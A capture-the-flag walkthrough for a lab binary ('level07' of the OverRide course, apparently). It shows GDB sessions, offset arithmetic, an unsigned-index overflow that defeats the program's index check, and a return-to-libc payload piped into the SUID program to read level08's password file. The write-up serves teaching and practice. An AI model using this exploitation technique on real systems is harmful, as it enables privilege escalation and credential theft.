# Walkthrough - Level 07

The program has SUID permissions from the user `level08`, which will allow us to obtain their flag.

# Disassembly

- `memset` zeros the program arguments and environment variables
- A loop waiting for commands on stdin: `store`, `read`, and `quit`
- A 400-byte buffer to store `int` values (`v6`)
- Functions `read_number` and `store_number` that use the buffer `v6`

# Exploit

The goal is to overwrite the EIP to exploit a return-to-libc.
The `store_number` function stores a number at a given index but doesn't check if the index is within the buffer (`v6`). We can therefore overflow the buffer to find the address of the EIP.
To do this, let's use GDB:
```bash
gdb ./level07
(gdb) b *0x080489f1 # Address of the return "quit"
(gdb) run
----------------------------------------------------
Welcome to wil's crappy number storage service!
----------------------------------------------------
Commands:
store - store a number into the data storage
read  - read a number from the data storage
quit  - exit the program
----------------------------------------------------
wil has reserved some storage :>
----------------------------------------------------
Input command: quit
Breakpoint 1, 0x080489f1 in main ()
(gdb) p $sp
$1 = (void *) 0xffffd71c
```

The EIP address is therefore at 0xffffd71c
Then we need to find the address of the start of the buffer to know the offset between the start and EIP.
```bash
gdb ./level07
(gdb) b *0x08048732 # Address of the start of main just after stack allocation
(gdb) b *0x080489f1 # Address of the return "quit"
(gdb) run
(gdb) p $sp
$1 = (void *) 0xffffd530
(gdb) continue
Input command: store
Number: 4
Index: 40
Completed store command successfully
Input command: store
Number: 5
Index: 41
Completed store command successfully
Input command: quit
(gdb) x/500xb 0xffffd530
0xffffd530: 0xe8 0xd6 0xff 0xff 0x14 0x00 0x00 0x00
0xffffd538: 0xc0 0xfa 0xfc 0xf7 0x14 0xc7 0xfd 0xf7
0xffffd540: 0x98 0x00 0x00 0x00 0xff 0xff 0xff 0xff
0xffffd548: 0x0c 0xd8 0xff 0xff 0xb8 0xd7 0xff 0xff
0xffffd550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd558: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd560: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd570: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd578: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd580: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd588: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd590: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd598: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5a0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5a8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5b0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5b8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5c0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5c8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5d0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5d8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5e0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5e8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd5f0: 0x00 0x00 0x00 0x00 0x04 0x00 0x00 0x00
0xffffd5f8: 0x05 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffd600: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
```

As we can see, the address of index 40 is `0xffffd5f4`, so the address of the start of the buffer is:
```
40 * 4 = 0xA0
0xffffd5f4 - 0xA0 = 0xffffd554
```

Let's calculate the offset between the start of the buffer and EIP:
```
0xffffd71c - 0xffffd554 = 0x1C8
```

This is 456 bytes, so the index of EIP is `456 / 4 = 114`
Since 114 is a multiple of 3, the `store_number` function prevents storing a number at this index. We will therefore exploit an integer overflow.
```
UINT_MAX / 4 + INDEX = NEW_INDEX
4294967296 / 4 + 114 = 1073741938
```

Now we just need the address of `system` and the address of the string `/bin/sh` for the return-to-libc.
```bash
gdb ./level07
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
The address of system is therefore `4159090384`
We still need the address of the string `/bin/sh`
```bash
gdb ./level07
(gdb) info proc map
process 1936
Mapped address spaces:
Start Addr End Addr Size Offset objfile
0x8048000 0x8049000 0x1000 0x0 /home/users/level07/level07
0x8049000 0x804a000 0x1000 0x1000 /home/users/level07/level07
0x804a000 0x804b000 0x1000 0x2000 /home/users/level07/level07
0xf7e2b000 0xf7e2c000 0x1000 0x0
0xf7e2c000 0xf7fcc000 0x1a0000 0x0 /lib32/libc-2.15.so
0xf7fcc000 0xf7fcd000 0x1000 0x1a0000 /lib32/libc-2.15.so
0xf7fcd000 0xf7fcf000 0x2000 0x1a2000 /lib32/libc-2.15.so
0xf7fcf000 0xf7fd0000 0x1000 0x1a2000 /lib32/libc-2.15.so
0xf7fd0000 0xf7fd4000 0x4000 0x0
0xf7fd8000 0xf7fdb000 0x3000 0x0
0xf7fdb000 0xf7fdc000 0x1000 0x0 [vdso]
0xf7fdc000 0xf7ffc000 0x20000 0x0 /lib32/ld-2.15.so
0xf7ffc000 0xf7ffd000 0x1000 0x1f000 /lib32/ld-2.15.so
0xf7ffd000 0xf7ffe000 0x1000 0x20000 /lib32/ld-2.15.so
0xfffdd000 0xffffe000 0x21000 0x0 [stack]
(gdb) shell
RELRO STACK CANARY NX disabled No PIE No RPATH No RUNPATH /home/users/level07/level07
level07@OverRide:~$ strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
15d7ec /bin/sh
```

The address of the string `/bin/sh` is `0xf7e2c000 + 0x15d7ec = 0xf7f897ec` so `4160264172`
Here is the complete command:
```bash
(python -c 'print("store")'; python -c 'print("4159090384")'; python -c 'print("1073741938")'; python -c 'print("store")';python -c 'print("4160264172")'; python -c 'print("116")'; python -c 'print("quit")'; echo "cat /home/users/level08/.pass") | ./level07
```

[Return-to-libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)